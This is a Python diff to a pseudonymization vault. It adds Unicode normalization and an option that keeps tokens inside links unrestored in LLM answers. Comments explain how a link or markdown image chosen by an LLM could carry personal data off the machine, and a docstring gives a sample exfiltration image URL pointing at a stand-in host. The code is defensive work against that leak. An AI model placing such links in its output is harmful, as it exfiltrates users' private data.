@@ -6,6 +6,7 @@ import json
 import os
 import re
 import secrets
+import unicodedata
 from pathlib import Path
 
 from . import entities as E
@@ -18,6 +19,22 @@ SALT_BYTES = 16
 _ID_SEPARATORS = re.compile(r"[\s\-‐‑–—.]+")
 _HANGUL_NAME = re.compile(r"[가-힣]+(?:[ \t]+[가-힣]+)+")
 
+# Links in an LLM answer: a value restored inside one leaves the computer without anyone
+# reading it (markdown images and link previews fetch the URL by themselves, a mailto: link
+# carries it in the message). See link_spans().
+_LINK = re.compile(
+    r"(?i)(?:\b(?:https?|ftps?|wss?|file|mailto|sms):|\bwww\.|(?<=[(=\"'])//)[^\s<>\"'`]*")
+
+
+def link_spans(text: str) -> list[tuple[int, int]]:
+    """(start, end) of URL-like parts of `text` (http(s)/ftp/ws/file/mailto/sms links,
+    www.-addresses, //host links in markdown or HTML attributes), up to the next space."""
+    return [m.span() for m in _LINK.finditer(text)]
+
+
+def _inside(start: int, end: int, spans: list[tuple[int, int]]) -> bool:
+    return any(s < end and start < e for s, e in spans)
+
 
 class VaultError(Exception):
     """Vault file cannot be opened: wrong passphrase, corrupted or unsupported file, conflict."""
@@ -28,9 +45,10 @@ def normalize_value(entity: str, value: str) -> str:
 
     Emails are casefolded; IDs made of ASCII letters/digits ignore spaces, hyphens and dots
     (and letter case); Korean names ignore spaces ("김 민준" == "김민준"); everything else
-    only collapses whitespace.
+    only collapses whitespace. Width and composition do not matter: full-width "０１０" equals
+    "010" and decomposed (NFD) Hangul equals the composed form.
     """
-    v = value.strip()
+    v = unicodedata.normalize("NFKC", value).strip()
     if entity == E.EMAIL or "@" in v:
         return v.casefold()
     compact = _ID_SEPARATORS.sub("", v)
@@ -61,6 +79,17 @@ class Vault:
     def __len__(self) -> int:
         return len(self.tokens)
 
+    def items(self) -> list[tuple[str, str, str]]:
+        """(entity, original, token) for every pseudonym, in the order tokens were issued.
+
+        `original` is the first spelling seen for the token. Keys merged from another vault
+        whose token is unknown here are skipped.
+        """
+        entity_of: dict[str, str] = {}
+        for (entity, _norm), token in self._keys.items():
+            entity_of.setdefault(token, entity)
+        return [(entity_of[t], o, t) for t, o in self.tokens.items() if t in entity_of]
+
     def token_for(self, entity: str, original: str, label: str) -> str:
         """Return the token for this value, issuing "[{label}{n}]" (n per entity) if new."""
         key = (entity, normalize_value(entity, original))
@@ -79,14 +108,42 @@ class Vault:
         self._restore_rx = None
         return token
 
-    def restore(self, text: str) -> str:
-        """Replace every known token in `text` with its original value (longest token first)."""
+    def restore(self, text: str, *, links: bool = True) -> str:
+        """Replace every known token in `text` with its original value (longest token first).
+
+        ``links=False`` leaves tokens inside URLs and e-mail links (:func:`link_spans`) as they
+        are, so a link chosen by an LLM answer (``![](https://x.example/?p=[이름1])``) cannot
+        carry the real value off the computer; :meth:`tokens_in_links` counts them."""
         if not self.tokens:
             return text
+        rx = self._token_rx()
+        if links:
+            return rx.sub(lambda m: self.tokens[m.group(0)], text)
+        spans = link_spans(text)
+        if not spans:
+            return rx.sub(lambda m: self.tokens[m.group(0)], text)
+
+        def sub(m: "re.Match[str]") -> str:
+            if _inside(m.start(), m.end(), spans):
+                return m.group(0)
+            return self.tokens[m.group(0)]
+
+        return rx.sub(sub, text)
+
+    def tokens_in_links(self, text: str) -> int:
+        """How many known tokens in `text` sit inside a URL or e-mail link."""
+        if not self.tokens:
+            return 0
+        spans = link_spans(text)
+        if not spans:
+            return 0
+        return sum(1 for m in self._token_rx().finditer(text) if _inside(m.start(), m.end(), spans))
+
+    def _token_rx(self) -> "re.Pattern[str]":
         if self._restore_rx is None:
             alts = sorted(self.tokens, key=lambda t: (-len(t), t))
             self._restore_rx = re.compile("|".join(map(re.escape, alts)))
-        return self._restore_rx.sub(lambda m: self.tokens[m.group(0)], text)
+        return self._restore_rx
 
     def merge(self, other: "Vault") -> None:
         """Add `other`'s mappings. A token meaning different originals in each raises VaultError."""
